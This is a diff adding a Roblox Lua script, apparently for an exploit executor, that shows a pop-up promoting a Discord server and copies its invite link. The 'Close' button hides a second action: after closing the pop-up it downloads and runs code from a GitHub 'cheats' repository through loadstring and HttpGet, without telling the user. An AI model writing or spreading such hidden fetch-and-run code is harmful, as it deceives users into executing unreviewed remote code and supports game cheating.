@@ -1,0 +1,119 @@
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+screenGui.Name = "DiscordInviteGui"
+
+-- Create main frame
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 300, 0, 150)
+frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+frame.BackgroundColor3 = Color3.fromRGB(35, 39, 42)
+frame.BorderSizePixel = 0
+frame.Parent = screenGui
+
+-- Add UI Corner for rounded edges
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0, 5)
+uiCorner.Parent = frame
+
+-- Add title
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 30)
+title.BackgroundTransparency = 1
+title.Text = "Join Discord"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 25
+title.Parent = frame
+
+-- Add description
+local description = Instance.new("TextLabel")
+description.Size = UDim2.new(1, -20, 0, 60)
+description.Position = UDim2.new(0, 10, 0, 40)
+description.BackgroundTransparency = 1
+description.Text = "For more awesome scripts Join friedpotato's server"
+description.TextColor3 = Color3.fromRGB(255, 255, 255)
+description.Font = Enum.Font.SourceSans
+description.TextSize = 27
+description.TextWrapped = true
+description.Parent = frame
+
+-- Create button container
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Size = UDim2.new(1, -20, 0, 40)
+buttonFrame.Position = UDim2.new(0, 10, 0, 100)
+buttonFrame.BackgroundTransparency = 1
+buttonFrame.Parent = frame
+
+-- Create Copy Link button
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(0, 120, 1, 0)
+copyButton.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
+copyButton.Text = "Copy Link"
+copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+copyButton.Font = Enum.Font.SourceSans
+copyButton.TextSize = 20
+copyButton.Parent = buttonFrame
+
+-- Add UI Corner to Copy button
+local copyCorner = Instance.new("UICorner")
+copyCorner.CornerRadius = UDim.new(0, 5)
+copyCorner.Parent = copyButton
+
+-- Create Close button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 120, 1, 0)
+closeButton.Position = UDim2.new(0.5, 10, 0, 0)
+closeButton.BackgroundColor3 = Color3.fromRGB(153, 170, 181)
+closeButton.Text = "Close"
+closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeButton.Font = Enum.Font.SourceSans
+closeButton.TextSize = 20
+closeButton.Parent = buttonFrame
+
+-- Add UI Corner to Close button
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(0, 5)
+closeCorner.Parent = closeButton
+
+-- Add hover effects
+copyButton.MouseEnter:Connect(function()
+    copyButton.BackgroundColor3 = Color3.fromRGB(103, 123, 196)
+end)
+copyButton.MouseLeave:Connect(function()
+    copyButton.BackgroundColor3 = Color3.fromRGB(114, 137, 218)
+end)
+closeButton.MouseEnter:Connect(function()
+    closeButton.BackgroundColor3 = Color3.fromRGB(134, 150, 160)
+end)
+closeButton.MouseLeave:Connect(function()
+    closeButton.BackgroundColor3 = Color3.fromRGB(153, 170, 181)
+end)
+
+-- Copy link functionality
+copyButton.MouseButton1Click:Connect(function()
+    local success, err = pcall(function()
+        game:GetService("ClipboardService"):SetText("https://discord.gg/mhFwYE4aG4")
+    end)
+    if success then
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Success",
+            Text = "Link copied to clipboard!",
+            Duration = 5
+        })
+    else
+        -- Fallback for exploits without ClipboardService
+        setclipboard("https://discord.gg/mhFwYE4aG4") -- Common exploit function
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+            Title = "Success",
+            Text = "Link copied to clipboard!",
+            Duration = 5
+        })
+    end
+end)
+
+-- Close GUI functionality
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Fibkad/cheats/refs/heads/main/sonic_tsb"))()
+end)
